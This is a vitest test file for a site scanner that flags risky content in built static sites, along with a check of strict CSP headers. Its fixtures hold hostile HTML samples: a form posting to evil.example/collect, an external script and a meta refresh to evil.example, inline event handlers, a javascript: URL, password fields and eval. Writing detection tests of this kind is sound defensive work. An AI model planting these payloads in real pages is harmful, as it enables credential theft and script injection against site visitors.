import { describe, expect, it } from "vitest";
import { publishedSiteHeaders, scanBuiltSite } from "./scan";

const f = (path: string, text: string) => ({ path, data: Buffer.from(text) });
const good = `<!doctype html><html><head><script type="module" crossorigin src="/assets/index-AbC1.js"></script></head><body><a href="/menu">Menu</a><a href="tel:+251911">Call</a></body></html>`;

describe("scanBuiltSite", () => {
  it("accepts a normal built site", () => {
    expect(scanBuiltSite([f("index.html", good), f("assets/index-AbC1.js", "console.log(1)"), f("robots.txt", "")])).toEqual([]);
  });

  it.each([
    ["inline-script", `<script>alert(1)</script>`],
    ["external-script", `<script src="https://evil.example/x.js"></script>`],
    ["iframe-tag", `<iframe src="https://bank.example"></iframe>`],
    ["script-url", `<a href="javascript:alert(1)">x</a>`],
    ["meta-refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
    ["inline-handler", `<img src="/a.png" onerror="alert(1)">`],
    ["password-field", `<input type="password" name="pin">`],
    ["external-form", `<form action="https://evil.example/collect"><input name="x"></form>`],
    ["base-tag", `<base href="https://evil.example/">`],
  ])("flags %s", (rule, html) => {
    const issues = scanBuiltSite([f("index.html", good.replace("<body>", `<body>${html}`))]);
    expect(issues.map((i) => i.rule)).toContain(rule);
  });

  it("allows forms that post to the Data API", () => {
    const html = good.replace("<body>", `<body><form action="https://api.gojoline.com/sites/1/forms"></form>`);
    expect(scanBuiltSite([f("index.html", html)], { allowedFormOrigins: ["https://api.gojoline.com"] })).toEqual([]);
  });

  it("flags password fields and eval in the bundle, scripts in SVGs and odd files", () => {
    const rules = scanBuiltSite([
      f("index.html", good),
      f("assets/a.js", `createElement("input",{type:"password"})`),
      f("assets/b.js", `eval("x")`),
      f("logo.svg", `<svg onload="alert(1)"></svg>`),
      f("run.php", "<?php ?>"),
    ]).map((i) => i.rule);
    expect(rules).toEqual(expect.arrayContaining(["password-field", "eval", "svg-script", "file-type"]));
  });

  it("requires an index page", () => {
    expect(scanBuiltSite([f("about.html", good)]).map((i) => i.rule)).toContain("missing-index");
  });
});

describe("publishedSiteHeaders", () => {
  it("is a strict CSP that only adds the Data API origin", () => {
    const csp = publishedSiteHeaders({ dataApiOrigin: "https://api.gojoline.com" }).find((h) => h.key === "Content-Security-Policy")!.value;
    expect(csp).toContain("script-src 'self';");
    expect(csp).toContain("form-action 'self' https://api.gojoline.com");
    expect(csp).toContain("frame-ancestors 'none'");
  });
});
